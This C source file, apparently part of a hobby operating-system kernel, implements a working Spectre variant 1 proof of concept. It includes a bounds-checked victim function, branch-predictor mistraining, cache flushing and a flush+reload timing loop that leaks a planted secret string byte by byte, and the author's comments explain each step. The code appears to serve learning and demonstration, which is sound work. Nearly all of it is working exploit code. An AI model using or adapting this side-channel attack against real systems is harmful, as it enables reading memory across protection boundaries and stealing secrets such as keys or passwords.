#include "spectre.h"
#include "../vulns.h"
#include "../../mm/mm.h"
#include "../../util/util.h"
#include "../../front/front.h"

/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t unused2[64];
uint8_t array2[256 * 512];

char* secret = "the secret word is: spaghetti\0";

uint8_t temp = 0; /* Used so compiler won't optimize out victim_function() */

void victim_function(int x)
{
	if (x < array1_size)
	{
		// temp is uninportant
		// it is multiplied by 512 to ensure that the cache line where array1 is accessed is not close to where array2 is accessed
		temp &= array2[array1[x] * 512];
	}
}

/********************************************************************
Analysis code
********************************************************************/
#define CACHE_HIT_THRESHOLD (80) /* assume cache hit if time <= threshold */

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(int malicious_x, uint8_t* value)
{
	static int results[256];
	int tries, i, j, k, mix_i;
	unsigned int junk = 0;
	int training_x, x;
	register uint64_t time1, time2;
	volatile uint8_t* addr;

	// zeroing out results array
	for (i = 0; i < 256; i++)
		results[i] = 0;


	for (tries = 999; tries > 0; tries--)
	{
		// flushing array2 from the cache is important as 
		// we are measuring the time it takes to read from array2 in the cache
		for (i = 0; i < 256; i++)
			flush(&array2[i * 512]); 

		// selects a "safe" value to read from the array for training
		// it must be done like this to confuse the branch predictor
		training_x = tries % array1_size; 

		// 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x)
		for (j = 29; j >= 0; j--)
		{
			// array1_size is the bounds check in the victim function.
			// we want to flush this in order for the CPU to specutivily
			// execute. if this were not flushed, the cpu would know that this
			// branch cannot be taken "instantly" and thus would not spectivily
			// execute our out of bounds access
			flush(&array1_size);

			// this is apparently a delay in order to give the cpu time to specutivily execute
			// but i think it's just to make sure that the array is flushed before speculation
			// begins.
			// will try using mfence to see if im correct
			for (volatile int z = 0; z < 100; z++)
			{
			} /* Delay (can also mfence) */

			// must avoid jumps in order to not let the branch predictor learn the pattern
			// if the branch predictor did learn the pattern, then it would start to learn when
			// the bounds access is valid or invalid -- which we do not want
			// we want it to not know wether it is valid/invalid and specutivily execute on invalid times as a result
			int select_values[2] = { training_x, malicious_x };
			x = select_values[j % 6 == 0];

			/* Call the victim! */
			victim_function(x);
		}

		// results is an array of 256 ints
		// each index in the array represents one possible value for the byte
		// the higher the score for each index, the more likely it is that the value at the associated address 
		// is the byte value denoted by the elements position in results
		//
		// results are timed in "random" order to try to prevent stride prediction
		for (i = 0; i < 256; i++)
		{
			mix_i = ((i * 167) + 13) & 255;
			addr = &array2[mix_i * 512];
			time1 = read_timestamp(); // READ TIMER 
			junk = *addr; // MEMORY ACCESS TO TIME 
			time2 = read_timestamp() - time1; // READ TIMER & COMPUTE ELAPSED TIME 
			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
				results[mix_i]++; // cache hit - add +1 to score for this value 
		}

		j = -1;
		for (i = 0; i < 256; i++)
			if (j < 0 || results[i] >= results[j])
				j = i;
	}

	*value = (uint8_t)j;
}

void spectre()
{
	int malicious_x = (int)(secret - (char *)array1); // default for malicious_x
	int len = strlen(secret);
	char output[len];
	uint8_t value;

	for (int i = 0; i < sizeof(array2); i++)
		array2[i] = 1; // write to array2 so in RAM not copy-on-write zero pages 

	for (int i = 0; i < len; i++)
	{
		readMemoryByte(malicious_x++, &value);
		output[i] = value;
	}

	print_string(output, 16, VGA_LIGHT_GRAY);
}

// start with an array that is bounds checked
// values in this array are used as an index into a second array
// if we control the index into the first array, the cpu can speculate into the second
// when it speculates, values will be placed into the cache
// using side channels, we can see if the second array speculated into some specific piece of memory
// boom?
